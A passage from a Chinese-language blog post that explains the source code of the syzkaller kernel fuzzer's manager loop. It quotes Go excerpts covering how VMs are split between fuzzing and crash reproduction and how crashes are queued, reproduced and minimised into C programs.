vmLoop()：启动 fuzzing，管控整体流程"></a>0x04. vmLoop()：启动 fuzzing，管控整体流程</h1><h2 id="一、VM-分组，初始化资源池等变量"><a href="#一、VM-分组，初始化资源池等变量" class="headerlink" title="一、VM 分组，初始化资源池等变量"></a>一、VM 分组，初始化资源池等变量</h2><p>一开始首先会将所有的 VM 分为两组：一组负责 fuzzing，一组负责复现 crash （<code>maxReproVMs</code>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>随后会调用 <code>SequentialResourcePool()</code> 新建一个 <code>ResourcePool</code> 队列，主要负责对<strong>空闲 VM 使用顺序</strong>的调控 ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>接下来会初始化一系列的变量：</p><ul><li><code>runDone</code>：保存 fuzzing 结果为 crash 的 <strong>Crash 队列</strong></li><li><code>pendingRepro</code>：标识<strong>待复现的 Crash</strong></li><li><code>reproducing</code>：标识<strong>某个类型 Crash</strong> 是否准备被复现</li><li><code>reproQueue</code>：Crash 的复现队列</li><li><code>reproDone</code>：Crash 的复现结果</li><li><code>stopPending</code>：等待停止标志位</li><li><code>shutdown</code>：工作终止标志位</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>最后进入到一个大循环中，这个大循环才是真正的 fuzzing 调控流程</p><h2 id="二、外层大循环：调配空闲-VM-进行-fuzz-amp-crash-repro，等待处理不同-channel-数据"><a href="#二、外层大循环：调配空闲-VM-进行-fuzz-amp-crash-repro，等待处理不同-channel-数据" class="headerlink" title="二、外层大循环：调配空闲 VM 进行 fuzz &amp; crash repro，等待处理不同 channel 数据"></a>二、外层大循环：调配空闲 VM 进行 fuzz &amp; crash repro，等待处理不同 channel 数据</h2><p>大循环的终止条件为 <code>shutdown == nil</code> 或是 ResourcePool 中的 VM 数量与总数量不相等，进入循环后首先会获取当前所在阶段： </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-内层小循环：获取待复现-crash-加入复现队列"><a href="#Step-1-内层小循环：获取待复现-crash-加入复现队列" class="headerlink" title="Step 1. 内层小循环：获取待复现 crash 加入复现队列"></a>Step 1. 内层小循环：获取待复现 crash 加入复现队列</h3><p>小循环会遍历 <code>pendingRepro</code> 中的 crash：</p><ul><li>若未被复现则从 pendingRepro 中删除</li><li>调用 <code>needRepro()</code> 检查是否需要复现</li><li>标记该标题的 crash 已在复现，并加入复现队列中</li></ul><p>这里的 <code>crash.Title</code> 其实是 <strong>Oops 的第一行文本，</strong>即<strong>同一时刻仅会复现同类 crash 中的一个</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-判断是否可以对-crash-进行复现并调控-VM"><a href="#Step-2-判断是否可以对-crash-进行复现并调控-VM" class="headerlink" title="Step 2. 判断是否可以对 crash 进行复现并调控 VM"></a>Step 2. 判断是否可以对 crash 进行复现并调控 VM</h3><p>接下来会输出一行日志，之后定义一个闭包函数 <code>canRepro</code>，用来判断<strong>当前是否可以进行 crash 复现</strong>，主要判断以下三个条件是否满足：</p><ul><li>当前阶段是否超过 <code>phaseTriagedHub</code> </li><li>待复现队列 <code>reproQueue</code> 是否不为空</li><li>加上该 crash 后所有用来复现 crash 的 VM 数量是否小于 <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> &amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是两个小循环：</p><h4 id="①-循环启动协程调度-VM-进行-crash-复现"><a href="#①-循环启动协程调度-VM-进行-crash-复现" class="headerlink" title="① 循环启动协程调度 VM 进行 crash 复现"></a>① 循环启动协程调度 VM 进行 crash 复现</h4><p>第一个小循环会循环判断是否可以进行 crash 复现：</p><ul><li>若可以复现则从资源池队列中取出一个 VM idx，若资源池为空则直接跳出</li><li>从 <code>reproQueue</code> 中取出一个 crash，更新 manager 的 <code>numReproducing</code> 计数</li><li>启动一个新的协程调用 <code>runRepro()</code> 对该 crash 进行复现，结果输出至 <code>reproDone</code> 队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p> 而 <code>runRepro()</code> 其实就是 <code>repro.Run()</code> 的 wrapper ＋ 一些错误检查后将 VM idx 放回资源池，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> 一开始主要是一些检查，之后根据 crash 类型的不同设置不同的复现时间上限：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// 以捕获更简单的 crashes (即 no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// 以捕获 &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection 可以被更快地检测到,</span><br><span class="hljs-comment">// 但理论上若其由竞争造成，则可能需要最长的 timeout.</span><br><span class="hljs-comment">// No output 仅能在最大的 timeout 下被复现.</span><br><span class="hljs-comment">// 作为妥协，我们使用最小与最大的 timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// 由于昂贵的设置与扫描，内存泄露不能被很快地检测到.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会将崩溃信息存储到一个 <code>context</code> 结构体中，并新建一个 WaitGroup：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>随后循环获取用以复现的 VM idx 并依次启动新协程调用 <code>CreateExecProgInstance()</code> <strong>创建 VM 并拷贝 crash 程序</strong>，若失败则休眠 10s 后重试，最多会尝试 <code>maxTry</code> 次；成功的结果会输出到 <code>ctx.instances</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// 一些收尾工作...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> 主要就是调用 <code>vmPool.Create()</code> 启动虚拟机后调用 <code>SetupExecProg()</code> 拷贝要执行的二进制文件，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt *OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>Run()</code>  中，其最后会调用 <code>context.repro()</code> <strong>正式开始复现 crash 的工作</strong>，检查结果后返回：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> 函数主要分两部分：</p><ul><li><p>调用 <code>extractProg()</code> <strong>获取触发 crash 的程序集合</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 去除在 crash 发生后执行的程序.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>最小化程序集合并尝试生成可以触发该 crash 的 C 程序，返回结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 尝试最小化程序集</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 首先尝试在不简化配置的情况下提取 C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 简化配置并尝试提取 C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 简化 C 相关的配置.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> 的逻辑比较简单：</p><ul><li>逆序后调用 <code>context.extractProgSingle()</code> <strong>逐个运行单个程序</strong>，若某一程序触发了 crash 则直接返回</li><li>若单一程序无法触发 crash，则调用 <code>context.extractProgBisect()</code> <strong>使用二分法找出触发 crash 的程序集合</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 